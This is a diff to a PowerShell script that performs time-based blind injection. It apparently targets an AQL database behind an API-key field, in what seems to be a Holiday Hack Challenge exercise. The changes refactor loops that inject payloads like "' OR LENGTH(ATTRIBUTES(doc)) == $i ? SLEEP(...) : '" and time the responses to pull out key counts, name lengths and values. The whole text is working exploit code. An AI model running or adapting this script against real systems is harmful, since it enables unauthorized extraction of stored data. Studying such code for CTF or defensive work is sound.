@@ -122,11 +122,11 @@ if(-not (Is-UUID -InputString $BotUUID)){
 }
 else{$botuuid = $BotUUID}
 
-if($SQLSleepTimeSeconds -and ($SQLSleepTimeSeconds -le 2.0 -and $SQLSleepTimeSeconds -ge 0.5)){
+if($SQLSleepTimeSeconds -and ($SQLSleepTimeSeconds -ge 0.5 -and $SQLSleepTimeSeconds -le 2.0)){
     $sleepytime = $SQLSleepTimeSeconds
 }
 else{
-    "Sleep time must be in range"
+    "Sleep time must be in range: 0.5 to 2.0"
     return
 }
 
@@ -136,8 +136,8 @@ $swtotal = [Diagnostics.Stopwatch]::StartNew()
 $sleepytimems = $sleepytime * 1000
 
 # The request response time should always be greater than the sleep time but
-# we'll set the margin just below that to be safe.
-$sleeperrormargin = $sleepytimems * 0.98
+# we'll set the margin just below that to be safe - HHC timewarps and all.
+$sleeperrormargin = $sleepytimems * 0.99
 
 
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
@@ -179,8 +179,8 @@ if(Test-Path -Path key-candidates.txt){
 }
 
 "`nTrying to find count of attribute names (keys) in doc including system keys: "
-1..10 | % {
-    $apikey = "`' OR LENGTH(ATTRIBUTES(doc)) == $_ ? SLEEP($sleepytime) : `'"
+foreach($i in 0..64){
+    $apikey = "`' OR LENGTH(ATTRIBUTES(doc)) == $i ? SLEEP($sleepytime) : `'"
 
     $sw = [Diagnostics.Stopwatch]::StartNew()
 
@@ -194,13 +194,14 @@ if(Test-Path -Path key-candidates.txt){
     $sw.Stop()
     $totalops++
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Found: " + $_
+        "Found: " + $i
+        break
     }
 }
 
 "`nTrying to find count of attribute names (keys) in doc excluding system keys: "
-1..10 | % {
-    $apikey = "`' OR LENGTH(ATTRIBUTES(doc, true)) == $_ ? SLEEP($sleepytime) : `'"
+foreach($i in 0..64){
+    $apikey = "`' OR LENGTH(ATTRIBUTES(doc, true)) == $i ? SLEEP($sleepytime) : `'"
 
     $sw = [Diagnostics.Stopwatch]::StartNew()
 
@@ -214,14 +215,15 @@ if(Test-Path -Path key-candidates.txt){
     $sw.Stop()
     $totalops++
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Found: " + $_
+        "Found: " + $i
+        break
     }
 }
 
 
 "`nTrying to find length of the attribute name in doc[0] excluding system keys: "
-1..20 | % {
-    $apikey = "`' OR LENGTH(ATTRIBUTES(doc, true)[0]) == $_ ? SLEEP($sleepytime) : `'"
+foreach($i in 0..64){
+    $apikey = "`' OR LENGTH(ATTRIBUTES(doc, true)[0]) == $i ? SLEEP($sleepytime) : `'"
 
     $sw = [Diagnostics.Stopwatch]::StartNew()
 
@@ -235,8 +237,9 @@ if(Test-Path -Path key-candidates.txt){
     $sw.Stop()
     $totalops++
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Found: " + $_
-        $len = $_ - 1
+        "Found: " + $i
+        $len = $i - 1
+        break
     }
 }
 
@@ -268,8 +271,8 @@ foreach($pos in 0..$len){
 
 
 "`nTrying to find length of the attribute value in doc.$name : "
-0..64 | % {
-    $apikey = "`' OR LENGTH(doc.$name) == $_ ? SLEEP($sleepytime) : `'"
+foreach($i in 0..64){
+    $apikey = "`' OR LENGTH(doc.$name) == $i ? SLEEP($sleepytime) : `'"
 
     $sw = [Diagnostics.Stopwatch]::StartNew()
 
@@ -283,8 +286,9 @@ foreach($pos in 0..$len){
     $sw.Stop()
     $totalops++
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Found: " + $_
-        $len = $_ - 1
+        "Found: " + $i
+        $len = $i - 1
+        break
     }
 }
 
